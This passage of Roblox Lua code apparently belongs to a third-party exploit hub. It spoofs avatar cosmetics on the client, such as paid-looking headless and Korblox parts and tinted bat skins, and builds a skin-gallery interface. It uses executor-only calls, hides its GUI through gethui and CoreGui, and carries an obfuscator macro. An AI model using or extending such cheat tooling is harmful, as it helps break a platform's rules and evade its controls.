		local handle=a:FindFirstChild("Handle"); if not handle or not handle:IsA("BasePart") then return a.Parent==c end
		local ha=handle:FindFirstChildWhichIsA("Attachment"); if not ha then return a.Parent==c end
		local ba
		for _,o in ipairs(c:GetDescendants()) do if o:IsA("Attachment") and o.Name==ha.Name and not o:IsDescendantOf(a) then ba=o; break end end
		local bp=ba and ba.Parent
		if bp and bp:IsA("BasePart") then
			handle.Anchored=false; handle.CanCollide=false; handle.CanTouch=false; handle.CanQuery=false; handle.Massless=true
			handle.CFrame=bp.CFrame*ba.CFrame*ha.CFrame:Inverse()
			local w=Instance.new("WeldConstraint"); w.Name="UnoVioletteAccessoryWeld"; w.Part0=bp; w.Part1=handle; w.Parent=handle
		end
		return true
	end
	local function addAsset(c,h,id)
		local ok,objs=pcall(function() return game:GetObjects("rbxassetid://"..tostring(id)) end)
		if not ok or type(objs)~="table" or #objs==0 then local x; local q=pcall(function() x=game:GetService("InsertService"):LoadAsset(id) end); if q and x then objs={x} else return false end end
		local added=false
		for _,root in ipairs(objs) do
			local list={}
			if root:IsA("Accessory") or root:IsA("Shirt") or root:IsA("Pants") or root:IsA("ShirtGraphic") then list={root} else for _,o in ipairs(root:GetDescendants()) do if o:IsA("Accessory") or o:IsA("Shirt") or o:IsA("Pants") or o:IsA("ShirtGraphic") then table.insert(list,o) end end end
			for _,src in ipairs(list) do
				local x=mark(src:Clone())
				if x:IsA("Accessory") then attach(c,h,x) else for _,old in ipairs(c:GetChildren()) do if old.ClassName==x.ClassName then old:Destroy() end end; x.Parent=c end
				added=true
			end
			pcall(function() root:Destroy() end)
		end
		return added
	end
	local function headless(c,on)
		local head=c and c:FindFirstChild("Head"); if not head then return end
		local t=on and 1 or 0; head.Transparency=t; head.LocalTransparencyModifier=t
		for _,o in ipairs(head:GetChildren()) do if o:IsA("Decal") or o:IsA("Texture") then o.Transparency=t end end
	end
	local function apply(c)
		local h=c and c:FindFirstChildOfClass("Humanoid"); if not h then return false end
		generation=generation+1; local token=generation; clearObjects(c)
		local old; pcall(function() old=h:GetAppliedDescription() end); if old and not originals[c] then originals[c]=old:Clone() end
		clearAccessories(c)
		if old then
			local d=old:Clone()
			for _,p in ipairs({"HatAccessory","HairAccessory","FaceAccessory","NeckAccessory","ShouldersAccessory","FrontAccessory","BackAccessory","WaistAccessory","ShirtAccessory","PantsAccessory","JacketAccessory","SweaterAccessory","ShortsAccessory","TShirtAccessory","DressSkirtAccessory"}) do pcall(function() d[p]="" end) end
			pcall(function() d.Shirt=0; d.Pants=0; d.GraphicTShirt=0 end)
			local skin=getVioletteSkinSet(violetteSkinMode) or VIOLETTE_SKIN_SETS["1"]
			pcall(function() d.HatAccessory=skin.hats or ""; d.HairAccessory=skin.hair or ""; if skin.head then d.Head=skin.head end; h:ApplyDescription(d) end); d:Destroy()
		end
		task.wait(); if not enabled or token~=generation or not c.Parent then return false end
		local skin=getVioletteSkinSet(violetteSkinMode) or VIOLETTE_SKIN_SETS["1"]
		for _,id in ipairs(skin.accessories or {}) do addAsset(c,h,id) end
		for _,id in ipairs(skin.clothing or {}) do addAsset(c,h,id) end
		headless(c,skin.headless==true); return true
	end
	local function clear(c)
		generation=generation+1; c=c or Player.Character; if not c then return end; clearObjects(c)
		local h=c:FindFirstChildOfClass("Humanoid"); local old=originals[c]
		if h and old then pcall(function() h:ApplyDescription(old:Clone()) end) else headless(c,false) end
	end
	FeaturePostToggle["Violette Custom Skins"]=function(on) enabled=on==true; if enabled then task.spawn(apply,Player.Character) else clear(Player.Character) end end
	_G._KawatanSkinColor = violetteSkinMode
	_G.__UnoVioletteSkinSet=function(mode)
		mode=tostring(mode); if not getVioletteSkinSet(mode) then return violetteSkinMode end
		violetteSkinMode=mode; _G._KawatanSkinColor=mode; if enabled then task.spawn(apply,Player.Character) end; saveConfig(); return mode
	end
	local lastSkinHalloweenMode = toggleStates["Halloween Mode"] == true
	_G.__UnoRefreshVioletteSkinTheme = function()
		local halloweenActive = toggleStates["Halloween Mode"] == true
		if halloweenActive == lastSkinHalloweenMode then return false end
		lastSkinHalloweenMode = halloweenActive
		refreshVioletteSkinCatalog()
		if enabled and Player.Character then task.spawn(apply, Player.Character) end
		if _G.__UnoRefreshSkinGalleryTheme then pcall(_G.__UnoRefreshSkinGalleryTheme) end
		return true
	end
	_G.__UnoTrackConn(Player.CharacterAdded:Connect(function(c) if enabled then task.wait(.75); if enabled then task.spawn(apply,c) end end end))
	_G.__UnoTrackStopper(function() enabled=false; clear(Player.Character) end)
	if toggleStates["Violette Custom Skins"] then
		enabled=true
		task.defer(apply, Player.Character)
	end
	end

	-- Custom bat skins: integrated into the Visual tab and applied to Bat tools.
	do
		local BAT_SKIN_ASSET_ID = "rbxassetid://18566246244"
		local BAT_SKIN_COLORS = {
			["Abyss Blue"] = Color3.fromRGB(0, 40, 150),
			["Venom Green"] = Color3.fromRGB(20, 255, 50),
			["Royal Gold"] = Color3.fromRGB(255, 200, 0),
			["Velvet Rose"] = Color3.fromRGB(220, 20, 100),
			["Crimson Night"] = Color3.fromRGB(90, 0, 20),
		}
		local batSkinModes = { "Default", "Abyss Blue", "Venom Green", "Royal Gold", "Velvet Rose", "Crimson Night", "RGB" }
		batSkinMode = batSkinMode or "Default"
		local cachedBatVisual = nil
		local batVisualLoading = false
		local originalBatHandles = setmetatable({}, { __mode = "k" })
		local batSkinGeneration = 0

		local function getBatVisual()
			if cachedBatVisual then return cachedBatVisual end
			if batVisualLoading then return nil end
			batVisualLoading = true
			local ok, objects = pcall(function() return game:GetObjects(BAT_SKIN_ASSET_ID) end)
			if ok and type(objects) == "table" and #objects > 0 then
				local root = objects[1]
				cachedBatVisual = root:IsA("BasePart") and root or root:FindFirstChildWhichIsA("BasePart", true)
				-- Keep the asset container alive when the cached part is a descendant.
			end
			batVisualLoading = false
			return cachedBatVisual
		end

		local function tintBatVisual(visual, color)
			if not visual then return end
			visual.Color = color
			if visual:IsA("UnionOperation") then pcall(function() visual.UsePartColor = true end) end
			local mesh = visual:FindFirstChildWhichIsA("SpecialMesh")
			if mesh then mesh.VertexColor = Vector3.new(color.R, color.G, color.B) end
		end

		local function restoreBat(tool)
			if not tool then return end
			local handle = tool:FindFirstChild("Handle")
			local saved = handle and originalBatHandles[handle]
			local visual = tool:FindFirstChild("CustomUnionVisual")
			if visual then pcall(function() visual:Destroy() end) end
			if not handle or not saved then return end
			handle.Transparency = saved.transparency
			for object, transparency in pairs(saved.children) do
				if object and object.Parent then pcall(function() object.Transparency = transparency end) end
			end
		originalBatHandles[handle] = nil
		end

		local function applyBatSkin(tool, token)
			if not tool or tool.Name ~= "Bat" then return end
			local handle = tool:FindFirstChild("Handle") or tool:WaitForChild("Handle", 2)
			if not handle or not handle:IsA("BasePart") then return end
			if batSkinMode == "Default" then restoreBat(tool); return end
			if token and token ~= batSkinGeneration then return end
			if not originalBatHandles[handle] then
				local children = {}
				for _, child in ipairs(handle:GetChildren()) do
					if child:IsA("SpecialMesh") or child:IsA("Mesh") or child:IsA("Decal") then children[child] = child.Transparency end
				end
				originalBatHandles[handle] = { transparency = handle.Transparency, children = children }
			end
			local source = getBatVisual()
			if not source then
				task.delay(0.25, function() if tool.Parent and batSkinMode ~= "Default" then applyBatSkin(tool, token) end end)
				return
			end
			local old = tool:FindFirstChild("CustomUnionVisual")
			if old then old:Destroy() end
			handle.Transparency = 1
			for child in pairs(originalBatHandles[handle].children) do pcall(function() child.Transparency = 1 end) end
			local visual = source:Clone()
			visual.Name = "CustomUnionVisual"
			visual.CanCollide = false; visual.CanTouch = false; visual.CanQuery = false; visual.Massless = true; visual.Anchored = false
			local tempModel = Instance.new("Model")
			visual.Parent = tempModel; tempModel.PrimaryPart = visual; tempModel:ScaleTo(2); visual.Parent = nil; tempModel:Destroy()
			if batSkinMode == "RGB" then tintBatVisual(visual, Color3.fromHSV((tick() % 3) / 3, 1, 1)) elseif BAT_SKIN_COLORS[batSkinMode] then tintBatVisual(visual, BAT_SKIN_COLORS[batSkinMode]) end
			for _, child in ipairs(visual:GetChildren()) do if child:IsA("Weld") or child:IsA("WeldConstraint") then child:Destroy() end end
			visual.CFrame = handle.CFrame * CFrame.new(-0.02, -0.52, -0.2) * CFrame.Angles(math.rad(45), 0, math.rad(5))
			visual.Parent = tool
			local weld = Instance.new("WeldConstraint"); weld.Part0 = handle; weld.Part1 = visual; weld.Parent = visual
		end

		local function scanBatContainer(container)
			for _, child in ipairs(container:GetChildren()) do if child:IsA("Tool") and child.Name == "Bat" then task.spawn(applyBatSkin, child, batSkinGeneration) end end
		end
		local function hookBatContainer(container)
			if not container then return end
			scanBatContainer(container)
			_G.__UnoTrackConn(container.ChildAdded:Connect(function(child) if child:IsA("Tool") and child.Name == "Bat" then task.defer(applyBatSkin, child, batSkinGeneration) end end))
		end
		local function clearAllBats()
			for _, container in ipairs({ Player.Character, Player:FindFirstChild("Backpack") }) do if container then for _, child in ipairs(container:GetChildren()) do if child:IsA("Tool") and child.Name == "Bat" then restoreBat(child) end end end end
		end
		local function setBatSkin(mode)
			mode = tostring(mode)
			for _, candidate in ipairs(batSkinModes) do if candidate == mode then batSkinMode = mode; break end end
			batSkinGeneration = batSkinGeneration + 1
			if batSkinMode == "Default" then clearAllBats() else
				for _, container in ipairs({ Player.Character, Player:FindFirstChild("Backpack") }) do if container then scanBatContainer(container) end end
			end
			saveConfig()
			return batSkinMode
		end
		_G.__UnoBatSkinSet = setBatSkin
		_G.__UnoBatSkinModes = batSkinModes
		_G.__UnoTrackConn(Player.CharacterAdded:Connect(function(character)
			task.wait(0.5); hookBatContainer(character); hookBatContainer(Player:FindFirstChild("Backpack"))
		end))
		hookBatContainer(Player.Character)
		hookBatContainer(Player:FindFirstChild("Backpack"))
		_G.__UnoTrackConn(RunService.RenderStepped:Connect(function()
			if batSkinMode ~= "RGB" then return end
			local character = Player.Character; local tool = character and character:FindFirstChild("Bat"); local visual = tool and tool:FindFirstChild("CustomUnionVisual")
			if visual then tintBatVisual(visual, Color3.fromHSV((tick() % 3) / 3, 1, 1)) end
		end))
		_G.__UnoTrackStopper(function() batSkinGeneration = batSkinGeneration + 1; clearAllBats(); cachedBatVisual = nil end)
		if batSkinMode ~= "Default" then task.defer(function() setBatSkin(batSkinMode) end) end
	end

	_G._UnoCustomSkinPicked = function(name)
		name = tostring(name)
		if _G.__UnoVioletteSkinSet then pcall(_G.__UnoVioletteSkinSet, name) end
		if not toggleStates["Violette Custom Skins"] then setFeature("Violette Custom Skins", true) end
	end


;(function()

    local LP  = Player
    local UIS = UserInputService

    if _G._UnoCustomSkinsGalleryRuntime and _G._UnoCustomSkinsGalleryRuntime.Destroy then
        pcall(_G._UnoCustomSkinsGalleryRuntime.Destroy)
    end

    local _conns = {}
    local function hubConnect(signal, handler)
        local c = signal:Connect(handler)
        _conns[#_conns + 1] = c
        return c
    end
;(function()
    local function new(class, props, kids)
        local o = Instance.new(class)
        for k, v in pairs(props or {}) do o[k] = v end
        for _, c in ipairs(kids or {}) do c.Parent = o end
        return o
    end
    local function corner(r) return new("UICorner", {CornerRadius = UDim.new(0, r)}) end
    local function stroke(c, t, tr)
        return new("UIStroke", {Color = c, Thickness = t or 1, Transparency = tr or 0,
            ApplyStrokeMode = Enum.ApplyStrokeMode.Border})
    end
    local Q = TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local function tw(o, ti, p)
        if typeof(o) ~= "Instance" then return end
        TweenService:Create(o, ti, p):Play()
    end
    local CAT_ACCENT = Color3.fromRGB(254, 254, 254)
    local CAT_PANEL  = Color3.fromRGB(18, 18, 18)
    local CAT_PANEL2 = Color3.fromRGB(32, 32, 32)
    local CAT_CARD   = Color3.fromRGB(10, 10, 10)
    local CAT_EDGE   = Color3.fromRGB(28, 28, 34)
    local CAT_EDGE_H = Color3.fromRGB(48, 48, 56)
    local CAT_DARK   = Color3.fromRGB(0, 0, 0)
    local CAT_TEXT   = Color3.fromRGB(255, 255, 255)
    local CAT_DIM    = Color3.fromRGB(150, 150, 155)
    local function accent()
        local a = _G._VioletteAccent
        return (typeof(a) == "Color3") and a or CAT_ACCENT
    end

    for _, root in ipairs({game:GetService("CoreGui"), LP:FindFirstChild("PlayerGui")}) do
        if root then
            local old = root:FindFirstChild("UnoCustomSkinsGallery")
            if old then pcall(function() old:Destroy() end) end
        end
    end

    local gui = new("ScreenGui", {
        Name = "UnoCustomSkinsGallery", ResetOnSpawn = false, IgnoreGuiInset = true,
        ZIndexBehavior = Enum.ZIndexBehavior.Sibling, DisplayOrder = 100001,
    })
    pcall(function() gui.Parent = (gethui and gethui()) or game:GetService("CoreGui") end)
    if not gui.Parent then gui.Parent = LP:WaitForChild("PlayerGui") end
    gui.Archivable = false
    pcall(function() gui:SetAttribute("_VlonEProtected", true) end)

    local compact = UIS.TouchEnabled and not UIS.KeyboardEnabled
    local PANEL_W, PANEL_H = (compact and 424 or 616), (compact and 456 or 632)
    local CELL_W, CELL_H = (compact and 126 or 190), (compact and 184 or 272)
    local PAD_X, PAD_Y = (compact and 2 or 5), (compact and 3 or 6)
    local SPIN_SPEED = 0.8
    local CAM_DIST, CAM_HEIGHT = 9.6, 0.5
    local HOVER_ZOOM = 0.86
    local DOLLY_RESPONSE = 9

    local backdrop = new("TextButton", {
        Parent = gui, Name = "CatalogBackdrop", Size = UDim2.fromScale(1, 1),
        BackgroundColor3 = Color3.fromRGB(0, 0, 0), BackgroundTransparency = 1,
        Text = "", AutoButtonColor = false, BorderSizePixel = 0,
        Visible = false, ZIndex = 200,
    })

    local panel = new("Frame", {
        Parent = backdrop, Name = "CatalogPanel",
        AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5),
        Size = UDim2.fromOffset(PANEL_W, PANEL_H),
        BackgroundColor3 = CAT_PANEL, BorderSizePixel = 0,
        Active = true, ZIndex = 201,
    }, {corner(14)})
    local panelEdge = stroke(accent(), 1.2, 0.55)
    panelEdge.Parent = panel
    local panelScale = new("UIScale", {Parent = panel, Scale = 1})
    new("UIGradient", {Parent = panel, Rotation = 35,
        Color = ColorSequence.new(CAT_PANEL, CAT_PANEL2)})

    local head = new("Frame", {
        Parent = panel, BackgroundTransparency = 1, Active = true,
        Position = UDim2.fromOffset(14, 8), Size = UDim2.new(1, -28, 0, 46), ZIndex = 202,
    })
    new("TextLabel", {
        Parent = head, Size = UDim2.new(1, -40, 0, 22), Position = UDim2.fromOffset(0, 2),
        BackgroundTransparency = 1, Text = "CUSTOM SKINS", Font = Enum.Font.GothamBlack,
        TextSize = compact and 16 or 18, TextColor3 = CAT_TEXT,
        TextXAlignment = Enum.TextXAlignment.Left, ZIndex = 203,
    })
    local subtitle = new("TextLabel", {
        Parent = head, Size = UDim2.new(1, -40, 0, 12), Position = UDim2.fromOffset(0, 24),
        BackgroundTransparency = 1, Text = "PICK A SKIN", Font = Enum.Font.GothamBold,
        TextSize = 9, TextColor3 = accent(), TextXAlignment = Enum.TextXAlignment.Left,
        ZIndex = 203,
    })
    local closeBtn = new("TextButton", {
        Parent = head, Name = "CloseCatalog", BackgroundTransparency = 1,
        Text = "\u{00D7}", TextSize = 20, TextColor3 = CAT_TEXT,
        Font = Enum.Font.GothamMedium, AutoButtonColor = false,
        Position = UDim2.new(1, -30, 0, 2), Size = UDim2.fromOffset(30, 30), ZIndex = 204,
    })

    local scrolling = new("ScrollingFrame", {
        Parent = panel, Name = "SetCards", BackgroundTransparency = 1, BorderSizePixel = 0,
        Position = UDim2.fromOffset(14, 58), Size = UDim2.new(1, -28, 1, -72),
        CanvasSize = UDim2.new(), ScrollBarThickness = 0, ZIndex = 202,
    })
    new("UIPadding", {Parent = scrolling,
        PaddingTop = UDim.new(0, 5), PaddingBottom = UDim.new(0, 5),
        PaddingLeft = UDim.new(0, 4), PaddingRight = UDim.new(0, 4)})
    local grid = new("UIGridLayout", {
        Parent = scrolling, CellSize = UDim2.fromOffset(CELL_W, CELL_H),
        CellPadding = UDim2.fromOffset(PAD_X, PAD_Y),
        HorizontalAlignment = Enum.HorizontalAlignment.Center,
        SortOrder = Enum.SortOrder.LayoutOrder,
    })
    grid:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        scrolling.CanvasSize = UDim2.fromOffset(0, grid.AbsoluteContentSize.Y + 12)
    end)

    local cards, shots = {}, {}
    local built, catalogOpen = false, false
    local panelDragging, panelDragEndedAt = false, 0
    local refreshCards
    local displayedSkinHalloweenMode = toggleStates["Halloween Mode"] == true

    local function dressPreview(rig, skin)
        rig.PrimaryPart = rig:FindFirstChild("HumanoidRootPart") or rig.PrimaryPart
        for _, object in ipairs(rig:GetDescendants()) do
            if object:IsA("BasePart") then
                object.CanCollide = false
                object.CastShadow = false
            elseif object:IsA("Script") or object:IsA("LocalScript") then
                object:Destroy()
            end
        end
        if skin.headless ~= false then
            local rigHead = rig:FindFirstChild("Head")
            if rigHead then
                rigHead.Transparency = 1
                for _, object in ipairs(rigHead:GetChildren()) do
                    if object:IsA("Decal") or object:IsA("Texture") then object.Transparency = 1 end
                end
            end
        end
        local mode = skin.korblox or "Off"
        for _, entry in ipairs({{"Left", "Left Leg"}, {"Right", "Right Leg"}}) do
            if mode == "Both" or mode == entry[1] then
                local config = _G._RaVeKorbloxAssets and _G._RaVeKorbloxAssets[entry[2]]
                local target = config and rig:FindFirstChild(config.targetBodyPart)
                if target then
                    for _, partName in ipairs(config.partsToHide) do
                        local limb = rig:FindFirstChild(partName)
                        if limb and limb:IsA("BasePart") then limb.Transparency = 1 end
                    end
                    local ok, objects = pcall(function() return game:GetObjects(config.id) end)
                    local source = ok and objects and objects[1]
                    local mesh = source and (source:IsA("BasePart") and source
                        or source:FindFirstChildWhichIsA("BasePart", true))
                    if mesh then
                        mesh.CanCollide = false
                        mesh.CastShadow = false
                        mesh.CFrame = target.CFrame * (config.offset or CFrame.new())
                        local weld = Instance.new("WeldConstraint")
                        weld.Part0, weld.Part1, weld.Parent = target, mesh, mesh
                        mesh.Parent = rig
                    end
                    if source and source ~= mesh and source.Parent ~= rig then
                        pcall(function() source:Destroy() end)
                    end
                end
            end
        end
    end

    local function seatStrays(rig)
        local root = rig:FindFirstChild("HumanoidRootPart")
        if not root then return end
        for _, accessory in ipairs(rig:GetChildren()) do
            if accessory:IsA("Accessory") then
                pcall(function()
                    local handle = accessory:FindFirstChild("Handle")
                    if not (handle and handle:IsA("BasePart")) then return end
                    if (handle.Position - root.Position).Magnitude <= 8 then return end

                    local handleAttachment = handle:FindFirstChildWhichIsA("Attachment")
                    local bodyAttachment
                    if handleAttachment then
                        for _, object in ipairs(rig:GetDescendants()) do
                            if object:IsA("Attachment") and object.Name == handleAttachment.Name
                                and not object:IsDescendantOf(accessory) then
                                bodyAttachment = object
                                break
                            end
                        end
                    end
                    local bodyPart = bodyAttachment and bodyAttachment.Parent
                    if bodyPart and bodyPart:IsA("BasePart") then
                        handle.CFrame = bodyPart.CFrame * bodyAttachment.CFrame
                            * handleAttachment.CFrame:Inverse()
                    else
                        local rigHead = rig:FindFirstChild("Head")
                        if rigHead then handle.CFrame = rigHead.CFrame end
                    end
                end)
            end
        end
    end

    local function loadCard(setName, card)
        card.loadGeneration = (card.loadGeneration or 0) + 1
        local loadGeneration = card.loadGeneration
        if card.shot.rig then pcall(function() card.shot.rig:Destroy() end); card.shot.rig = nil end
        card.loading.Visible = true
        card.loading.Text = "LOADING"
        task.spawn(function()
            local description = _G._KawatanBuildSetDescription
                and _G._KawatanBuildSetDescription(setName)
            if not description then
                if card.loadGeneration == loadGeneration then card.loading.Text = "N/A" end
                return
            end
            local rig
            local ok = pcall(function()
                rig = Players:CreateHumanoidModelFromDescriptionAsync(description, Enum.HumanoidRigType.R15)
            end)
            if not ok or not rig then
                pcall(function()
                    rig = Players:CreateHumanoidModelFromDescription(description, Enum.HumanoidRigType.R15)
                end)
            end
            pcall(function() description:Destroy() end)
            if card.loadGeneration ~= loadGeneration then
                if rig then pcall(function() rig:Destroy() end) end
                return
            end
            if not rig or not (rig:FindFirstChild("UpperTorso") or rig:FindFirstChild("Torso")) then
                if rig then pcall(function() rig:Destroy() end) end
                card.loading.Text = "N/A"
                return
            end

            pcall(dressPreview, rig, _G._KawatanSkinSets[setName])
            rig.Parent = card.world

            task.wait()
            pcall(seatStrays, rig)
            for _, object in ipairs(rig:GetDescendants()) do
                if object:IsA("BasePart") then object.Anchored = true end
            end
            pcall(function() rig:PivotTo(CFrame.new()) end)
            card.shot.rig = rig
            card.loading.Visible = false
        end)
    end

    local function selectSet(name)
        _G._KawatanSkinColor = name
        if _G._UnoCustomSkinPicked then
            pcall(_G._UnoCustomSkinPicked, name)
        end
        if refreshCards then refreshCards() end
    end

    for index, setName in ipairs(_G._KawatanSkinSetOrder or {}) do
        local card = new("TextButton", {
            Parent = scrolling, Name = setName .. "Preview", LayoutOrder = index,
            BackgroundColor3 = CAT_CARD, BackgroundTransparency = 0,
            BorderSizePixel = 0, Text = "", AutoButtonColor = false, ZIndex = 203,
            Visible = (_G._KawatanSkinSets or {})[setName] ~= nil,
        }, {corner(10)})
        local cardStroke = stroke(CAT_EDGE, 1, 0)
        cardStroke.Parent = card

        local viewport = new("ViewportFrame", {
            Parent = card, Name = "AvatarPreview",
            BackgroundColor3 = CAT_DARK, BackgroundTransparency = 0,
            BorderSizePixel = 0, Position = UDim2.fromOffset(7, 7),
            Size = UDim2.new(1, -14, 1, -34),
            Ambient = Color3.fromRGB(255, 255, 255), LightColor = Color3.fromRGB(255, 255, 255),
            LightDirection = Vector3.new(-0.25, -0.5, -0.83), ZIndex = 204,
        }, {corner(8)})

        local world = new("WorldModel", {Parent = viewport})
        local camera = new("Camera", {Parent = viewport, FieldOfView = 42,
            CFrame = CFrame.lookAt(Vector3.new(0, CAM_HEIGHT, CAM_DIST),
                Vector3.new(0, CAM_HEIGHT, 0))})
        viewport.CurrentCamera = camera

        local loading = new("TextLabel", {
            Parent = viewport, Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1,
            Text = "LOADING", Font = Enum.Font.GothamBold, TextSize = 9,
            TextColor3 = CAT_DIM, ZIndex = 205,
        })

        local label = new("TextLabel", {
            Parent = card, Position = UDim2.new(0, 8, 1, -24),
            Size = UDim2.new(1, -16, 0, 19), BackgroundTransparency = 1, Text = ((_G._KawatanSkinSets or {})[setName] or {}).displayName or tostring(setName):gsub("_", " "),
            Font = Enum.Font.GothamBlack, TextSize = 10,
            TextColor3 = CAT_DIM,
            TextXAlignment = Enum.TextXAlignment.Center, ZIndex = 204,
        })

        local shot = {camera = camera, rig = nil, phase = index * 0.47,
            distance = CAM_DIST, current = CAM_DIST, target = CAM_DIST}
        shots[#shots + 1] = shot

        card.Activated:Connect(function() selectSet(setName) end)
        card.MouseEnter:Connect(function()
            shot.target = shot.distance * HOVER_ZOOM
            if _G._KawatanSkinColor ~= setName then
                tw(cardStroke, Q, {Color = CAT_EDGE_H, Transparency = 0})
                tw(label, Q, {TextColor3 = CAT_TEXT})
            end
        end)
        card.MouseLeave:Connect(function()
            shot.target = shot.distance
            if refreshCards then refreshCards() end
        end)

        cards[setName] = {card = card, stroke = cardStroke, viewport = viewport,
            world = world, camera = camera, label = label, loading = loading,
            shot = shot}
    end

    refreshCards = function()
        local live = accent()
        panelEdge.Color = live
        subtitle.TextColor3 = live
        for setName, entry in pairs(cards) do
            local on = setName == _G._KawatanSkinColor
            tw(entry.stroke, Q, {
                Color = on and live or CAT_EDGE,
                Thickness = on and 2 or 1, Transparency = 0,
            })
            tw(entry.label, Q, {TextColor3 = on and CAT_TEXT or CAT_DIM})
        end
    end
    refreshCards()
    _G._KawatanRefreshGalleryCards = refreshCards
    _G.__UnoRefreshSkinGalleryTheme = function()
        local halloweenActive = toggleStates["Halloween Mode"] == true
        refreshCards()
        local themeChanged = halloweenActive ~= displayedSkinHalloweenMode
        for setName, entry in pairs(cards) do
            local skin = (_G._KawatanSkinSets or {})[setName]
            entry.card.Parent = skin and scrolling or nil
            entry.card.Visible = skin ~= nil
            if skin and entry.label then entry.label.Text = skin.displayName or tostring(setName) end
            if themeChanged and skin and built and catalogOpen then loadCard(setName, entry) end
        end
        if not themeChanged then return end
        if not built then displayedSkinHalloweenMode = halloweenActive; return end
        if catalogOpen then displayedSkinHalloweenMode = halloweenActive end
    end
    _G.__UnoRefreshSkinGalleryTheme()

    local elapsed = 0
    hubConnect(RunService.RenderStepped, LPH_NO_VIRTUALIZE(function(dt)
        if not catalogOpen then return end
        elapsed = elapsed + dt
        local ease = math.min(dt * DOLLY_RESPONSE, 1)
        for _, shot in ipairs(shots) do
            if shot.rig and shot.rig.Parent then
                local breath = math.cos(elapsed * 3 + shot.phase) * 0.035
                pcall(function()
                    shot.rig:PivotTo(CFrame.new(0, breath, 0)
                        * CFrame.Angles(0, math.pi + elapsed * SPIN_SPEED + shot.phase, 0))
                end)
            end
            if shot.camera.Parent then
                shot.current = shot.current + (shot.target - shot.current) * ease
                shot.camera.CFrame = CFrame.lookAt(
                    Vector3.new(0, CAM_HEIGHT, shot.current), Vector3.new(0, CAM_HEIGHT, 0))
            end
        end
    end))

    local function closeCatalog()
        catalogOpen = false
        tw(backdrop, Q, {BackgroundTransparency = 1})
        tw(panelScale, TweenInfo.new(0.14, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
            {Scale = 0.9})
        task.delay(0.16, function()
            if not catalogOpen then backdrop.Visible = false end
        end)
    end

    _G._KawatanOpenSkinGallery = function()
        catalogOpen = true
        refreshCards()
        if _G.__UnoRefreshSkinGalleryTheme then pcall(_G.__UnoRefreshSkinGalleryTheme) end
        for _, shot in ipairs(shots) do shot.target = shot.distance end
        backdrop.Visible = true
        backdrop.BackgroundTransparency = 1
        panelScale.Scale = 0.9
        tw(backdrop, TweenInfo.new(0.2), {BackgroundTransparency = 0.42})
        tw(panelScale, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
            {Scale = 1})
        if built then return end
        built = true
        task.spawn(function()
            for _, setName in ipairs(_G._KawatanSkinSetOrder or {}) do
                local entry = cards[setName]
                if entry then loadCard(setName, entry) end
                task.wait(0.12)
            end
        end)
    end
    _G._KawatanCloseSkinGallery = closeCatalog

    closeBtn.Activated:Connect(closeCatalog)
    backdrop.MouseButton1Click:Connect(function()
        if panelDragging or (os.clock() - panelDragEndedAt) < 0.25 then return end
        closeCatalog()
    end)

    do
        local startInput, startPosition, dragInput
        head.InputBegan:Connect(function(input)
            if input.UserInputType ~= Enum.UserInputType.MouseButton1
                and input.UserInputType ~= Enum.UserInputType.Touch then return end
            panelDragging, startInput, startPosition, dragInput =
                true, input.Position, panel.Position, input
        end)
        head.InputChanged:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement
                or input.UserInputType == Enum.UserInputType.Touch then
                dragInput = input
            end
        end)
        hubConnect(UIS.InputChanged, function(input)
            if not panelDragging then return end
            if input ~= dragInput and input.UserInputType ~= Enum.UserInputType.MouseMovement then return end
            local delta = input.Position - startInput
            panel.Position = UDim2.new(startPosition.X.Scale, startPosition.X.Offset + delta.X,
                startPosition.Y.Scale, startPosition.Y.Offset + delta.Y)
        end)
        hubConnect(UIS.InputEnded, function(input)
            if not panelDragging then return end
            if input == dragInput
                or input.UserInputType == Enum.UserInputType.MouseButton1
                or input.UserInputType == Enum.UserInputType.Touch then
                panelDragging, dragInput = false, nil
                panelDragEndedAt = os.clock()
            end
        end)
    end
end)()

    _G._UnoCustomSkinsGalleryRuntime = {
        Destroy = function()
            for _, c in ipairs(_conns) do pcall(function() c:Disconnect() end) end
            _conns = {}
            pcall(function() gui:Destroy() end)
            _G._UnoCustomSkinsGalleryRuntime = nil
        end,
    }
end)()
	do
	local appearanceState = _G.__UnoVisualAppearanceState
	if type(appearanceState) ~= "table" or appearanceState.version ~= 2 then
		appearanceState = {
			version = 2,
			headless = setmetatable({}, {__mode = "k"}),
			korblox = setmetatable({}, {__mode = "k"}),
		}
		_G.__UnoVisualAppearanceState = appearanceState
	end
	appearanceState.setHeadless = function(active, character)
		character = character or Player.Character
		local head = character and character:FindFirstChild("Head")
		if not head or not head:IsA("BasePart") then return false end
		if active then
			if not appearanceState.headless[character] then
				local saved = {headTransparency = head.Transparency, headLocalTransparency = head.LocalTransparencyModifier, faces = {}}
				for _, item in ipairs(head:GetChildren()) do
					if item:IsA("Decal") or item:IsA("Texture") then
						table.insert(saved.faces, {item = item, transparency = item.Transparency})
					end
				end
				appearanceState.headless[character] = saved
			end
			head.Transparency = 1
			head.LocalTransparencyModifier = 1
			for _, item in ipairs(head:GetChildren()) do
				if item:IsA("Decal") or item:IsA("Texture") then item.Transparency = 1 end
			end
			return true
		end
		local saved = appearanceState.headless[character]
		if not saved then return false end
		head.Transparency = saved.headTransparency
		head.LocalTransparencyModifier = saved.headLocalTransparency
		for _, face in ipairs(saved.faces) do
			if face.item and face.item.Parent then face.item.Transparency = face.transparency end
		end
		return true
	end
	appearanceState.setKorblox = function(active, character)
		character = character or Player.Character
		if not character then return false end
		local saved = appearanceState.korblox[character]
		if not active then
			local oldVisual = character:FindFirstChild("UnoVisual_Korblox")
			if oldVisual then pcall(function() oldVisual:Destroy() end) end
			for _, child in ipairs(character:GetChildren()) do
				if child:IsA("CharacterMesh") and child.Name == "UnoVisual_KorbloxCharacterMesh" then
					pcall(function() child:Destroy() end)
				end
			end
			if not saved then return false end
			for _, partState in ipairs(saved.parts) do
				if partState.part and partState.part.Parent then
					partState.part.Transparency = partState.transparency
					partState.part.LocalTransparencyModifier = partState.localTransparency
				end
			end
			return true
		end
		local target = character:FindFirstChild("LeftUpperLeg") or character:FindFirstChild("Left Leg")
		if not target or not target:IsA("BasePart") then return false end
